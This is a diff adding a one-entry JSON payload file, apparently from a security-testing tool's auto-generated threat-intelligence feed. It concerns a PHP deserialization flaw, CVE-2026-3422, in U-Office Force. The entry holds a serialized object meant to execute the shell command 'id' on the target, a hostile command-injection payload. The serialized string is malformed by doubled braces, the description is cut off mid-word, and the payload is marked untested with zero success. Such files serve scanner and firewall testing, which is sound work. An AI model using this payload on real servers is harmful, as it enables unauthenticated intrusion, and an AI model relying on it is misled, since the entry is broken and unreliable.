@@ -1,0 +1,31 @@
+{
+  "category": "deserialization",
+  "subcategory": "threat_intel_deserialization",
+  "description": "Auto-discovered payloads from threat intelligence feeds",
+  "source": "fray threat-intel feed",
+  "count": 1,
+  "payloads": [
+    {
+      "id": "threat-intel-CVE-2026-3422-0000",
+      "category": "deserialization",
+      "subcategory": "php_unserialize",
+      "payload": "O:8:\"Exploit\":1:{{s:4:\"exec\";s:2:\"id\";}}",
+      "description": "CVE-2026-3422: U-Office Force developed by e-Excellence has a Insecure Deserialization vulnerability, allowing unauthenticated remote a",
+      "source": "NVD (CVSS 9.8)",
+      "tested_against": [],
+      "success_rate": 0.0,
+      "blocked": false,
+      "cve": "CVE-2026-3422",
+      "severity": "critical",
+      "reference": "https://www.twcert.org.tw/en/cp-139-10743-9a952-2.html",
+      "technique": "php_unserialize",
+      "date_discovered": "2026-03-09",
+      "tags": [
+        "auto-generated",
+        "threat-intel",
+        "cve-2026-3422"
+      ]
+    }
+  ],
+  "last_updated": "2026-03-09T06:02:41.036553+00:00"
+}
